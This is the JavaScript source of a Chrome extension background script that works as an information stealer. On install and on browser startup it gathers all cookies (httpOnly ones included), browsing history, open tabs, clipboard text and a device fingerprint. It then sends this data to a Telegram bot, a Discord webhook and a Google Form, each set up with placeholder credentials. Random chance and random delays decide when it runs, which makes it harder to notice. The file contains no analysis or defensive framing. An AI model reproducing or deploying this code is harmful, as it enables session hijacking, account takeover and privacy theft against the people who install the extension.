const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
const GOOGLE_FORM_URL = "https://docs.google.com/forms/d/e/YOURTOKEN/formResponse";
const FORM_COOKIE_FIELD = "entry.YOUR_CODE";

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function exfilTelegram(message) {
  return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.slice(0, 4000) })
  });
}

function exfilDiscord(message) {
  return fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message.slice(0, 1900) })
  });
}

function exfilGoogleForms(data) {
  const formData = new URLSearchParams();
  formData.append(FORM_COOKIE_FIELD, data.slice(0, 9000));
  return fetch(GOOGLE_FORM_URL, {
    method: "POST",
    body: formData
  });
}

function sendAll(title, content) {
  const timestamp = new Date().toISOString();
  const message = `📡 *${title}*\n🕒 ${timestamp}\n\n${content}`;
  exfilTelegram(message);
  exfilDiscord(message);
  exfilGoogleForms(message);
}

async function collectCookies() {
  return new Promise(resolve => {
    chrome.cookies.getAll({}, function (cookies) {
      const jsonCookies = cookies.map(c => ({
        domain: c.domain,
        name: c.name,
        value: c.value,
        path: c.path,
        httpOnly: c.httpOnly,
        secure: c.secure,
        sameSite: c.sameSite,
        expirationDate: c.expirationDate
      }));
      resolve(JSON.stringify(jsonCookies, null, 2));
    });
  });
}

async function collectHistory() {
  return new Promise(resolve => {
    chrome.history.search({ text: "", maxResults: 50 }, function (items) {
      const formatted = items.map(i => `${new Date(i.lastVisitTime).toISOString()} - ${i.url}`).join("\n");
      resolve(formatted);
    });
  });
}

async function collectTabs() {
  return new Promise(resolve => {
    chrome.tabs.query({}, function (tabs) {
      const info = tabs.map(t => `[${t.active ? "🟢" : "⚫"}] ${t.title} - ${t.url}`).join("\n");
      resolve(info);
    });
  });
}

async function getClipboard() {
  try {
    const result = await navigator.clipboard.readText();
    return result ? result : "No clipboard content.";
  } catch (e) {
    return "Clipboard access denied.";
  }
}

function getFingerprint() {
  return new Promise(resolve => {
    const fingerprint = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString(),
      sessionId: crypto.randomUUID()
    };
    resolve(JSON.stringify(fingerprint, null, 2));
  });
}

async function runCollection() {
  const delay = ms => new Promise(r => setTimeout(r, ms));
  await delay(Math.random() * 4000 + 1000);

  const [fp, cookies, history, tabs, clipboard] = await Promise.all([
    getFingerprint(),
    collectCookies(),
    collectHistory(),
    collectTabs(),
    getClipboard()
  ]);

  sendAll("🧠 Device Fingerprint", fp);
  await sleep(1000);

  sendAll("🍪 Stored Cookies (JSON)", cookies);
  await sleep(1000);

  sendAll("🕘 Browser History", history);
  await sleep(1000);

  sendAll("🧩 Open Tabs", tabs);
  await sleep(1000);

  sendAll("📋 Clipboard Content", clipboard);
}

chrome.runtime.onStartup.addListener(() => {
  const shouldRun = Math.random() > 0.3;
  if (shouldRun) runCollection();
});

chrome.runtime.onInstalled.addListener(() => {
  const shouldRun = Math.random() > 0.4;
  if (shouldRun) runCollection();
});


  
